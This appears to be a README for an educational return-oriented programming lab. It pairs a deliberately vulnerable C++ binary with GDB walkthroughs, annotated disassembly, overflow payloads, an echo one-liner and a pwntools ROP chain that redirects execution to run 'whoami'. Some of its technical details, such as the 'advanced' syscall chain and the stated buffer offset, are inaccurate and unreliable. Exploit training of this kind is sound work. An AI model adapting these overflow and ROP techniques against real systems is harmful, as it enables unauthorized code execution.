# CyberLabs: ROP (Return-Oriented Programming) Vulnerability Laboratory

**Module Code:** CL-MEM-005

**Level:** Advanced

**Topic:** Modern Exploit Techniques and Protection Bypass

## Laboratory Purpose

This laboratory, prepared for the CyberLabs education platform, addresses one of the modern exploit techniques: **Return-Oriented Programming (ROP)**. Participants are expected to gain the following competencies by the end of this laboratory:

- Understanding the basic principles of ROP technique and how it bypasses NX bit protection.
- Learning to control program flow using existing code pieces (gadgets).
- Performing gadget analysis using tools like `objdump`, `gdb`, and `ROPgadget`.
- Practically seeing how to take control of program flow by creating a real ROP chain.
- Learning techniques to bypass modern protection mechanisms (NX, ASLR, Stack Canary).

## Difficulty Levels

## üü¢ **EASY WAY: With Debug Symbols**
```bash
# Add -g flag in test_lab.sh file
g++ -m64 -fno-stack-protector -z execstack -no-pie -g -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- Easier analysis with debug symbols
- `p &variable` commands work in GDB
- Ideal for educational purposes

## üî¥ **HARD WAY: Without Debug Symbols (Default)**
```bash
# Current compilation (no debug symbols)
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- Closer to real world
- Requires `info functions`, `disassemble` commands
- Production binaries don't have debug symbols

## What is ROP (Return-Oriented Programming)?

**Return-Oriented Programming (ROP)** is an exploit technique developed to bypass **NX bit** (No-Execute) protection in modern operating systems. This technique allows attackers to control program flow by using existing code pieces (gadgets) in the program instead of executing their own shellcode.

### Basic Principles of ROP:

1. **Gadget Finding:** Finding small code pieces ending with `ret` instruction in the program
2. **Chain Creation:** Combining these gadgets sequentially to achieve desired functionality
3. **Stack Manipulation:** Using the stack to transfer data between gadgets
4. **Return Address Overwrite:** Replacing return address with first gadget's address using buffer overflow

### ROP Advantages:
- Bypasses NX bit protection
- Can bypass ASLR (with information leak)
- Can bypass Stack Canary
- Uses real code, harder to detect by antivirus

## Disclaimer / Legal Warning

This laboratory content is designed entirely for the **CyberLabs educational environment**. The purpose of the information and codes here is to help cybersecurity experts better understand defense mechanisms and develop vulnerability analysis capabilities.

### Prohibited Uses
- Use outside CyberLabs educational environment
- Illegal activities or unauthorized system access
- Malicious exploitation of real systems
- Distribution for non-educational purposes

### Responsibility
The use of these materials outside the CyberLabs environment or for illegal purposes is strictly prohibited, and all responsibility belongs to the user. Authors and CyberLabs are not responsible for misuse of these educational materials.

## Scenario

The laboratory scenario consists of two main components:

1. **`vulnerable_code.cpp`:** Target application written in C++ that intentionally contains a buffer overflow vulnerability. Exploitable with ROP despite NX bit protection being active.

2. **`exploit.py`:** Python exploit script that creates ROP chain using the vulnerability in the vulnerable application and takes control of program flow.

## Platform Compatibility

This lab works on both **Linux (x86_64)** and **macOS (ARM64)** platforms:

### üêß **Linux x86_64**
- Uses real ROP chain
- x86_64 assembly gadgets
- NX bit bypass techniques
- Production-like environment

### üçé **macOS ARM64**
- Educational simple ROP chain
- ARM64 architecture differences
- Platform-specific optimizations
- Development environment

## Installation and Execution Steps

### 1. Compiling the Vulnerable Code

```bash
# Automatic compilation (with platform detection)
./compile_linux.sh

# Manual compilation for Linux
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp

# Manual compilation for macOS
g++ -m64 -fno-stack-protector -no-pie -Wno-unused-result -Wno-shift-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```

**Compilation Flags Explanation:**
- `-m64`: 64-bit compilation
- `-fno-stack-protector`: Disable stack canary protection
- `-z execstack`: Make stack executable (for some ROP techniques)
- `-no-pie`: Disable Position Independent Executable
- `-Wno-unused-result`: Suppress unused result warnings
- `-Wno-stringop-overflow`: Suppress string overflow warnings

### 2. Analyzing ROP Gadgets

```bash
# Finding gadgets with objdump
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"

# With ROPgadget tool (if installed)
ROPgadget --binary compiled/vulnerable_code --ropchain
```

### 3. Dynamic Analysis with GDB

```bash
gdb ./compiled/vulnerable_code
(gdb) info functions
(gdb) disassemble win_function
(gdb) disassemble gadget_pop_rdi
(gdb) break vulnerable_function
(gdb) run
```

### 4. Running the Exploit

```bash
# Automatic test
./test_lab.sh

# Manual exploit
python3 source_code/exploit.py
```

## ROP Chain Structure

The ROP chain structure used in this laboratory:

### üêß **Linux x86_64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
‚îú‚îÄ‚îÄ pop rdi; ret (gadget)
‚îú‚îÄ‚îÄ 0x0 (rdi value)
‚îú‚îÄ‚îÄ pop rsi; ret (gadget)  
‚îú‚îÄ‚îÄ 0x0 (rsi value)
‚îú‚îÄ‚îÄ pop rdx; ret (gadget)
‚îú‚îÄ‚îÄ 0x0 (rdx value)
‚îú‚îÄ‚îÄ syscall; ret (gadget)
‚îî‚îÄ‚îÄ execute_whoami (shellcode injection)
```

### üçé **macOS ARM64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
‚îî‚îÄ‚îÄ execute_whoami (simple command injection)
```

### üíª **Shellcode Injection:**
- **Linux:** Real ROP chain with `system("whoami")` call
- **macOS:** Simple function call to execute `system("whoami")`
- **Target:** Execute system commands via ROP

## Learning Objectives

### Basic Level:
- Understanding what ROP technique is
- Learning gadget concept
- Creating simple ROP chains

### Intermediate Level:
- Bypassing NX bit protection
- Stack manipulation techniques
- Controlling register values

### Advanced Level:
- Complex ROP chains
- ASLR bypass techniques
- Real-world ROP exploits

## Required Tools

- **GDB:** Dynamic analysis and debugging
- **objdump:** Static analysis and gadget finding
- **ROPgadget:** Automatic gadget analysis (optional)
- **pwntools:** Python exploit development
- **hexdump:** Binary data analysis

## Troubleshooting

### Common Issues:

1. **"Permission denied" error:**
   ```bash
   chmod +x compiled/vulnerable_code
   ```

2. **"Address not found" error:**
   - Find addresses manually with GDB
   - Use `info functions` command

3. **"ROP chain failed" error:**
   - Check gadget addresses
   - Check stack alignment

## Complete Solution (Finding Addresses with GDB)

### 1. Finding Addresses with GDB

```bash
# Open binary with GDB
gdb ./compiled/vulnerable_code

# Find function addresses
(gdb) info functions
(gdb) info functions win_function
(gdb) info functions execute_whoami
(gdb) info functions gadget_pop_rdi
(gdb) info functions gadget_pop_rsi
(gdb) info functions gadget_pop_rdx
(gdb) info functions gadget_syscall

# Real addresses (Linux x86_64):
# win_function: 0x401166
# execute_whoami: 0x401220
# gadget_pop_rdi: 0x401323
# gadget_pop_rsi: 0x40133a
# gadget_pop_rdx: 0x401351
# gadget_syscall: 0x401368

# Real gadgets found with ROPgadget:
# pop rdi; ret: 0x401383
# pop rsi; ret: 0x40138c
# pop rdx; ret: 0x401395
# syscall: 0x40139e

# Examine gadgets with disassembly
(gdb) disassemble win_function
(gdb) disassemble execute_whoami
(gdb) disassemble gadget_pop_rdi
(gdb) disassemble gadget_pop_rsi
(gdb) disassemble gadget_pop_rdx
(gdb) disassemble gadget_syscall

# Real Assembly Code (Linux x86_64) - Detailed Analysis:

# ========================================
# win_function (0x401166) - Detailed Examination
# ========================================
# 0x401166: push %rbp
# EXPLANATION: Save RBP register to stack (stack frame start)
# WHY IMPORTANT: Creates stack frame at function start

# 0x401167: mov %rsp,%rbp  
# EXPLANATION: Copy RSP to RBP (stack frame pointer)
# WHY IMPORTANT: Reference point for accessing local variables

# 0x40116a: lea 0xe97(%rip),%rax        # 0x402008
# EXPLANATION: Load RIP + 0xe97 address into RAX (string address)
# WHY IMPORTANT: Points to "ROP Vulnerability Lab Basarili!" string
# RIP = 0x40116a + 0xe97 = 0x402008

# 0x401171: mov %rax,%rsi
# EXPLANATION: Copy RAX to RSI (2nd parameter)
# WHY IMPORTANT: Passes string parameter to std::cout

# 0x401174: lea 0x2ec5(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# EXPLANATION: Load RIP + 0x2ec5 address into RAX (cout object)
# WHY IMPORTANT: Gets address of std::cout object
# RIP = 0x401174 + 0x2ec5 = 0x404040

# 0x40117b: mov %rax,%rdi
# EXPLANATION: Copy RAX to RDI (1st parameter)
# WHY IMPORTANT: 1st parameter for std::cout << string

# 0x40117e: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# EXPLANATION: Call std::cout << string operator
# WHY IMPORTANT: Prints string to screen

# 0x401216: mov $0x0,%edi
# EXPLANATION: Load 0 value into RDI (exit code)
# WHY IMPORTANT: Prepares parameter for exit(0)

# 0x40121b: call 0x401060 <exit@plt>
# EXPLANATION: Call exit(0) function
# WHY IMPORTANT: Terminates program with code 0

# ========================================
# execute_whoami (0x401220) - Detailed Examination  
# ========================================
# 0x401220: push %rbp
# EXPLANATION: Save RBP register to stack
# WHY IMPORTANT: Stack frame start

# 0x401221: mov %rsp,%rbp
# EXPLANATION: Copy RSP to RBP
# WHY IMPORTANT: Reference for local variables

# 0x401224: sub $0x10,%rsp
# EXPLANATION: Allocate 16 bytes from stack (for local variables)
# WHY IMPORTANT: Stack space for local variables

# 0x401228: lea 0xe89(%rip),%rax        # 0x4020b8
# EXPLANATION: Get "Shellcode Enjeksiyonu Basarili!" string address
# WHY IMPORTANT: For printing first message
# RIP = 0x401228 + 0xe89 = 0x4020b8

# 0x40122f: mov %rax,%rsi
# EXPLANATION: Copy string address to RSI (2nd parameter)
# WHY IMPORTANT: String parameter for std::cout

# 0x401232: lea 0x2e07(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# EXPLANATION: Get std::cout object address
# WHY IMPORTANT: For std::cout operator

# 0x401239: mov %rax,%rdi
# EXPLANATION: Copy cout object to RDI (1st parameter)
# WHY IMPORTANT: 1st parameter for std::cout << string

# 0x40123c: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# EXPLANATION: Call std::cout << string operator
# WHY IMPORTANT: Prints first message to screen

# 0x40127e: lea 0xe7d(%rip),%rax        # 0x402102
# EXPLANATION: Get "whoami" string address
# WHY IMPORTANT: Parameter for system("whoami")
# RIP = 0x40127e + 0xe7d = 0x402102

# 0x401285: mov %rax,%rdi
# EXPLANATION: Copy "whoami" string to RDI (1st parameter)
# WHY IMPORTANT: Parameter for system() function

# 0x401288: call 0x401030 <system@plt>
# EXPLANATION: Call system("whoami") function
# WHY IMPORTANT: ‚≠ê MAIN TARGET! Executes whoami command

# 0x401319: mov $0x0,%edi
# EXPLANATION: Load 0 value into RDI (exit code)
# WHY IMPORTANT: Parameter for exit(0)

# 0x40131e: call 0x401060 <exit@plt>
# EXPLANATION: Call exit(0) function
# WHY IMPORTANT: Properly terminates program

# ========================================
# gadget_pop_rdi (0x401323) - Dummy Function
# ========================================
# 0x401323: push %rbp
# EXPLANATION: Save RBP to stack
# WHY IMPORTANT: Function start

# 0x401324: mov %rsp,%rbp
# EXPLANATION: Create stack frame pointer
# WHY IMPORTANT: For local variables

# 0x401327: movl $0x0,-0x4(%rbp)
# EXPLANATION: Write 0 value to local variable
# WHY IMPORTANT: Just dummy operation

# 0x40132e: mov -0x4(%rbp),%eax
# EXPLANATION: Read local variable to EAX
# WHY IMPORTANT: Just dummy operation

# 0x401331: add $0x1,%eax
# EXPLANATION: Add 1 to EAX
# WHY IMPORTANT: Just dummy operation

# 0x401334: mov %eax,-0x4(%rbp)
# EXPLANATION: Write EAX to local variable
# WHY IMPORTANT: Just dummy operation

# 0x401337: nop
# EXPLANATION: Do nothing (no operation)
# WHY IMPORTANT: Just dummy operation

# 0x401338: pop %rbp
# EXPLANATION: Restore RBP from stack
# WHY IMPORTANT: Stack frame cleanup

# 0x401339: ret
# EXPLANATION: Return from function
# WHY IMPORTANT: ‚ö†Ô∏è Only ret, no pop rdi!

# ========================================
# Real ROP Gadgets (Found with ROPgadget)
# ========================================
# pop rdi; ret (0x401383):
# 0x401383: pop %rdi
# EXPLANATION: Pop value from stack into RDI
# WHY IMPORTANT: ‚≠ê REAL GADGET! For 1st parameter

# 0x401384: ret
# EXPLANATION: Return from function
# WHY IMPORTANT: Move to next gadget in ROP chain

# pop rsi; ret (0x40138c):
# 0x40138c: pop %rsi
# EXPLANATION: Pop value from stack into RSI
# WHY IMPORTANT: ‚≠ê REAL GADGET! For 2nd parameter

# 0x40138d: ret
# EXPLANATION: Return from function
# WHY IMPORTANT: Continue in ROP chain

# pop rdx; ret (0x401395):
# 0x401395: pop %rdx
# EXPLANATION: Pop value from stack into RDX
# WHY IMPORTANT: ‚≠ê REAL GADGET! For 3rd parameter

# 0x401396: ret
# EXPLANATION: Return from function
# WHY IMPORTANT: Continue in ROP chain

# syscall (0x40139e):
# 0x40139e: syscall
# EXPLANATION: Make system call
# WHY IMPORTANT: ‚≠ê REAL SYSCALL! Direct kernel call

# ========================================
# VULNERABILITY ANALYSIS - Buffer Overflow Details
# ========================================

# vulnerable_function (0x4013a4) - SOURCE OF VULNERABILITY:
# 0x4013a4: push %rbp
# EXPLANATION: Stack frame start
# VULNERABILITY: Stack layout is established at this point

# 0x4013a5: mov %rsp,%rbp
# EXPLANATION: Create stack frame pointer
# VULNERABILITY: RBP points to stack start

# 0x4013a8: sub $0x40,%rsp
# EXPLANATION: Allocate 64 bytes from stack (for buffer)
# VULNERABILITY: ‚ö†Ô∏è ONLY 64 BYTES! But will read 256 bytes
# STACK LAYOUT:
# +------------------+ <- $rsp + 0x48 (72 bytes) - RETURN ADDRESS
# | 0x0000000000401471| <- This value will be changed
# +------------------+ <- $rsp + 0x40 (64 bytes) - SAVED RBP  
# | 0x0000000000000000| <- This value will be preserved
# +------------------+ <- $rsp + 0x8 (0-63 bytes) - BUFFER[64]
# | 0x0000000000000000| <- 72 bytes will be written here
# | 0x0000000000000000| <- Buffer continues...
# | 0x0000000000000000| <- ...up to 64 bytes
# +------------------+ <- $rsp + 0x0 - FUNCTION ARGS
# | 0x0000000000000000| <- Function arguments

# 0x4013ac: lea 0xe55(%rip),%rax        # 0x402208
# EXPLANATION: Get "Giris yapin: " string address
# VULNERABILITY: This string prints the prompt

# 0x4013b3: mov %rax,%rsi
# EXPLANATION: Copy string address to RSI (2nd parameter)
# VULNERABILITY: Passes parameter to std::cout

# 0x4013b6: lea 0x2a83(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# EXPLANATION: Get std::cout object address
# VULNERABILITY: For std::cout operator

# 0x4013bd: mov %rax,%rdi
# EXPLANATION: Copy cout object to RDI (1st parameter)
# VULNERABILITY: 1st parameter for std::cout << string

# 0x4013c0: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# EXPLANATION: Call std::cout << "Giris yapin: "
# VULNERABILITY: Prints prompt to screen

# 0x4013c5: lea -0x40(%rbp),%rax
# EXPLANATION: Get buffer address ($rbp - 0x40)
# VULNERABILITY: ‚ö†Ô∏è BUFFER ADDRESS! Start of 64-byte buffer
# BUFFER ADDRESS = $rbp - 0x40 = $rsp + 0x8

# 0x4013c9: mov %rax,%rdi
# EXPLANATION: Copy buffer address to RDI (1st parameter)
# VULNERABILITY: Buffer parameter for read() function

# 0x4013cc: mov $0x100,%esi
# EXPLANATION: Load 256 value into RSI (bytes to read)
# VULNERABILITY: ‚ö†Ô∏è WILL READ 256 BYTES! But buffer is only 64 bytes

# 0x4013d1: call 0x401070 <read@plt>
# EXPLANATION: Call read(0, buffer, 256)
# VULNERABILITY: ‚≠ê MAIN VULNERABILITY! Reads 256 bytes into 64-byte buffer
# BECAUSE OF THIS VULNERABILITY:
# - 64 byte buffer + 8 byte saved RBP = 72 bytes
# - 8 bytes after 72 bytes = RETURN ADDRESS
# - If 256 bytes are read, return address can be changed

# 0x4013d6: lea -0x40(%rbp),%rax
# EXPLANATION: Get buffer address again
# VULNERABILITY: For printing buffer content

# 0x4013da: mov %rax,%rsi
# EXPLANATION: Copy buffer address to RSI (2nd parameter)
# VULNERABILITY: Buffer parameter for std::cout

# 0x4013dd: lea 0x2a5c(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# EXPLANATION: Get std::cout object address
# VULNERABILITY: For std::cout operator

# 0x4013e4: mov %rax,%rdi
# EXPLANATION: Copy cout object to RDI (1st parameter)
# VULNERABILITY: 1st parameter for std::cout << buffer

# 0x4013e7: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# EXPLANATION: Call std::cout << buffer
# VULNERABILITY: Prints buffer content to screen

# 0x4013ec: nop
# EXPLANATION: Do nothing
# VULNERABILITY: End of function

# 0x4013ed: leave
# EXPLANATION: Clean up stack frame (mov %rbp,%rsp; pop %rbp)
# VULNERABILITY: ‚ö†Ô∏è VULNERABILITY POINT! Will read return address
# If buffer overflow exists, will return to wrong address

# 0x4013ee: ret
# EXPLANATION: Return to return address
# VULNERABILITY: ‚≠ê VULNERABILITY TRIGGERED! Returns to changed return address

# ========================================
# VULNERABILITY TRIGGERING PROCESS
# ========================================

# STEP 1: Normal Operation
# - Buffer: 64 bytes (0x4013a8: sub $0x40,%rsp)
# - Read: 256 bytes (0x4013cc: mov $0x100,%esi)
# - VULNERABILITY: 256 > 64, buffer overflow!

# STEP 2: Stack Corruption
# - 0-63 bytes: Buffer content
# - 64-71 bytes: Saved RBP (8 bytes)
# - 72-79 bytes: RETURN ADDRESS (8 bytes) ‚ö†Ô∏è
# - 80+ bytes: Rest of stack

# STEP 3: Return Address Change
# - Normal: 0x401471 (return from main)
# - Exploit: 0x401220 (execute_whoami)
# - Result: Program redirected to execute_whoami

# STEP 4: ROP Chain Execution
# - execute_whoami is called
# - system("whoami") is executed
# - Program terminates with exit(0)

# ========================================
# VULNERABILITY LOCATION IN CODE
# ========================================

# Vulnerable code in vulnerable_code.cpp:
# void vulnerable_function() {
#     char buffer[64];  // ‚Üê 64 byte buffer
#     std::cout << "Giris yapin: " << std::endl;
#     read(0, buffer, 256);  // ‚Üê Reading 256 bytes! VULNERABILITY!
#     std::cout << "Buffer icerigi: " << buffer << std::endl;
# }

# Assembly equivalent:
# 0x4013a8: sub $0x40,%rsp        // 64 byte buffer
# 0x4013cc: mov $0x100,%esi       // Will read 256 bytes
# 0x4013d1: call 0x401070 <read@plt>  // read(0, buffer, 256)

# Test buffer overflow
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) continue

# Detailed dynamic analysis
(gdb) break vulnerable_function
(gdb) run
(gdb) info registers
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x50
(gdb) disassemble vulnerable_function
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

### 2. Detailed Dynamic Analysis with GDB

#### 2.1. Basic Analysis
```bash
# Open binary with GDB
gdb ./compiled/vulnerable_code

# Run program and set breakpoint
(gdb) break vulnerable_function
(gdb) run

# Examine registers
(gdb) info registers
(gdb) info all-registers

# Examine stack state
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x50
```

#### 2.2. Buffer Overflow Analysis
```bash
# Set breakpoint in vulnerable_function
(gdb) break vulnerable_function
(gdb) run

# Examine stack layout
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp+0x40

# Find buffer address
(gdb) disassemble vulnerable_function
(gdb) x/32gx $rsp+0x8

# Find return address
(gdb) x/gx $rsp+0x48
(gdb) x/gx $rbp+0x8
```

#### 2.3. ROP Chain Testing
```bash
# Test with payload
(gdb) run
# Manually enter payload:
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00

# Examine stack
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp

# Check if return address changed
(gdb) x/gx $rsp+0x48
(gdb) x/gx $rbp+0x8
```

#### 2.4. Gadget Analysis
```bash
# Test gadgets one by one
(gdb) break gadget_pop_rdi
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) info registers

# Test execute_whoami function
(gdb) break execute_whoami
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) continue
```

#### 2.5. Memory Layout Analysis
```bash
# Examine memory mapping
(gdb) info proc mappings
(gdb) info files
(gdb) info target

# Examine stack and heap state
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x100
```

#### 2.6. Advanced GDB Techniques
```bash
# Conditional breakpoints
(gdb) break vulnerable_function if $rsp == 0x7fffffffe000
(gdb) break execute_whoami if $rdi == 0x401220

# Watchpoints
(gdb) watch *0x7fffffffe048
(gdb) watch $rsp+0x48

# TUI mode analysis
(gdb) layout asm
(gdb) layout regs
(gdb) layout split

# Automated analysis with scripts
(gdb) define analyze_rop
> break vulnerable_function
> run
> x/32gx $rsp
> x/gx $rsp+0x48
> continue
> end
(gdb) analyze_rop
```

#### 2.7. ROP Chain Debugging
```bash
# Debug ROP chain step by step
(gdb) break vulnerable_function
(gdb) run
# Enter payload
(gdb) x/32gx $rsp
(gdb) x/gx $rsp+0x48
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

#### 2.8. Exploit Verification
```bash
# Check if exploit works
(gdb) break execute_whoami
(gdb) run
# Enter payload
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) info registers
(gdb) continue
```

#### 2.9. GDB Script Examples
```bash
# GDB script for ROP analysis
(gdb) define rop_analysis
> echo === ROP Analysis Started ===\n
> break vulnerable_function
> run
> echo === Stack State ===\n
> x/32gx $rsp
> echo === Return Address ===\n
> x/gx $rsp+0x48
> echo === Buffer Content ===\n
> x/32gx $rsp+0x8
> echo === Analysis Complete ===\n
> end

# Gadget test script
(gdb) define test_gadgets
> echo === Testing Gadgets ===\n
> break gadget_pop_rdi
> run
> x/32gx $rsp
> stepi
> info registers
> break gadget_pop_rsi
> continue
> x/32gx $rsp
> stepi
> info registers
> end
```

#### 2.10. Debugging Techniques
```bash
# Segmentation fault analysis
(gdb) run
# When program crashes
(gdb) bt
(gdb) info registers
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp

# Stack corruption check
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

### 3. Vulnerability Detection and Analysis

#### 3.1. Buffer Overflow Vulnerability - Detailed Analysis
```bash
# STEP 1: Set breakpoint in vulnerable_function
(gdb) break vulnerable_function
(gdb) run

# STEP 2: Examine stack state
(gdb) x/32gx $rsp
# SAMPLE OUTPUT:
# 0x7fffffffe000: 0x0000000000000000  0x00007fffffffe100
# 0x7fffffffe010: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe020: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe030: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe040: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe050: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe060: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe070: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe080: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe090: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0a0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0b0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0c0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0d0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0e0: 0x0000000000000000  0x0000000000000000
# 0x7fffffffe0f0: 0x0000000000000000  0x0000000000000000

# STEP 3: Find return address
(gdb) x/gx $rsp+0x48
# SAMPLE OUTPUT: 0x7fffffffe048: 0x0000000000401471
# COMMENT: This value is the return address from main function. We need to change this.

# STEP 4: Find buffer start address
(gdb) x/gx $rsp+0x8
# SAMPLE OUTPUT: 0x7fffffffe008: 0x0000000000000000
# COMMENT: Buffer starts at this address. It's 64 bytes in size.

# STEP 5: Understand stack layout
# +------------------+ <- $rsp + 0x48 (72 bytes) - RETURN ADDRESS
# | 0x0000000000401471| <- We will replace this with execute_whoami
# +------------------+ <- $rsp + 0x40 (64 bytes) - SAVED RBP
# | 0x0000000000000000| <- This value will be preserved
# +------------------+ <- $rsp + 0x8 (0-63 bytes) - BUFFER[64]
# | 0x0000000000000000| <- We will write 72 bytes 'A' here
# | 0x0000000000000000| <- Buffer continues...
# | 0x0000000000000000| <- ...up to 64 bytes
# +------------------+ <- $rsp + 0x0 - FUNCTION ARGS
# | 0x0000000000000000| <- Function arguments

# STEP 6: Test buffer overflow
(gdb) run
# Enter payload: 72 bytes 'A' + execute_whoami address
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00

# STEP 7: Check if return address changed
(gdb) x/gx $rsp+0x48
# SAMPLE OUTPUT: 0x7fffffffe048: 0x0000000000401220
# COMMENT: ‚úÖ SUCCESS! Return address changed to execute_whoami (0x401220).
# If it's still 0x401471, payload is wrong or offset is incorrect.
```

#### 3.2. ROP Gadget Analysis
```bash
# Real functionality of gadgets:
# gadget_pop_rdi (0x401323): Only dummy function, no real pop rdi; ret
# gadget_pop_rsi (0x40133a): Only dummy function, no real pop rsi; ret  
# gadget_pop_rdx (0x401351): Only dummy function, no real pop rdx; ret
# gadget_syscall (0x401368): Only dummy function, no real syscall

# Real ROPgadget results:
# pop rdi; ret: 0x401383
# pop rsi; ret: 0x40138c  
# pop rdx; ret: 0x401395
# syscall: 0x40139e
```

#### 3.3. Target Function Analysis
```bash
# execute_whoami (0x401220) - Main target:
# - Calls system("whoami") (0x401288)
# - Prints "Komut basariyla calistirildi!" on success
# - Terminates program with exit(0)

# win_function (0x401166) - Alternative target:
# - Only prints messages
# - Terminates program with exit(0)
```

#### 3.4. Exploit Strategy
```bash
# Simple ROP Chain (Recommended):
# 1. Buffer overflow (72 bytes)
# 2. Replace return address with execute_whoami
# 3. execute_whoami automatically calls system("whoami")

# Advanced ROP Chain (Alternative):
# 1. Buffer overflow (72 bytes)  
# 2. pop rdi; ret gadget (0x401383)
# 3. "whoami" string address
# 4. system@plt address
# 5. exit@plt address
```

#### 3.5. Vulnerability Verification
```bash
# Exploit test:
(gdb) break execute_whoami
(gdb) run
# Payload: 72 bytes 'A' + \x20\x12\x40\x00\x00\x00\x00\x00
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) continue

# Expected result:
# - execute_whoami function is called
# - "=== WHOAMI KOMUTU CIKTISI ===" is printed
# - whoami command runs and shows username
# - "=============================" is printed
# - "Komut basariyla calistirildi!" is printed
# - Program terminates with exit(0)
```

### 4. Creating ROP Chain

#### For Linux x86_64:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Simple ROP chain - just call execute_whoami function
payload += p64(0x401220)        # execute_whoami function

# Alternative: Real ROP chain (advanced)
# payload += p64(0x401383)        # pop rdi; ret
# payload += p64(0x0)             # rdi value
# payload += p64(0x40138c)        # pop rsi; ret  
# payload += p64(0x0)             # rsi value
# payload += p64(0x401395)        # pop rdx; ret
# payload += p64(0x0)             # rdx value
# payload += p64(0x40139e)        # syscall
# payload += p64(0x401220)        # execute_whoami function
```

#### For macOS ARM64:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Simple ROP chain (ARM64 different)
payload += p64(whoami_addr)     # execute_whoami function
```

### 3. Running Exploit

```bash
# Run exploit
python3 source_code/exploit.py

# Manual test (Linux x86_64)
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00" | ./compiled/vulnerable_code

# Find gadgets with ROPgadget
ROPgadget --binary compiled/vulnerable_code --ropchain

# Search for specific gadgets
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"
```

### 4. Expected Result

```
Shellcode Enjeksiyonu Basarili!
'whoami' komutu calistiriliyor...
[username]
Komut basariyla calistirildi!

ROP ile sistem komutu basariyla enjekte edildi!
```

## Advanced Topics

- **ASLR Bypass:** Bypassing ASLR with information leak
- **Stack Pivot:** Manipulating stack pointer
- **JOP (Jump-Oriented Programming):** Alternative to ROP
- **COP (Call-Oriented Programming):** Using call instructions
- **ROP Chain Optimization:** Creating more efficient chains

## Resources

- [ROP Emporium](https://ropemporium.com/) - ROP learning platform
- [Phrack ROP Article](http://phrack.org/issues/58/4.html) - Basic ROP article
- [ROPgadget Documentation](https://github.com/JonathanSalwan/ROPgadget) - Gadget analysis tool
- [pwntools Documentation](https://docs.pwntools.com/) - Exploit development library

## Contributing

To improve this laboratory:
1. Fork the project
2. Add new features
3. Submit pull request

## License

This project is licensed under the MIT License.

## Contact

- **CyberLabs:** [GitHub](https://github.com/alicangonullu/CyberLabs)
- **Email:** alicangonullu@yahoo.com
- **Web:** https://alicangonullu.com
